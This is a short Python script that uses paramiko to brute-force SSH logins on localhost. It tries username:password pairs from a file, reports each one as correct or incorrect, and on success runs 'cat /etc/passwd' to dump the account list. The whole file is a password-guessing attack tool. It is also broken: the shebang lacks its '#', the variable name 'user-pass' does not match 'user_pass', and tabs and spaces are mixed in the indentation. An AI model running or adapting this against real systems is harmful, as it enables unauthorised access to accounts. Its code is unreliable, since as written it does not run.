!/usr/bin/env python

import paramiko

import sys

ssh = paramiko.SSHClient()

ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

fd = open(sys.argv[1], "r")

# Assume the user-pass file is of the form username:password\n

for line in fd.readlines():
    user_pass = line.strip().split(':')
	
	try: 
	    
		ssh.connect('localhost', username=user-pass[0], password=user_pass[1])
		
	except paramiko.AuthenticationException:
	
	    print '[-] Username %s and Password %s is Incorrect' % (user-pass[0], user-pass[1])
		
    else: 
	    print '[+] Username %s and Password %s is Correct!!!' % (user-pass[0], user-pass[1])

        stdin, stdout, stderr = ssh.exec_command('cat /etc/passwd')

        for line in stdout.readline():
             print line.strip()
			 
		break
	
	
ssh.close()
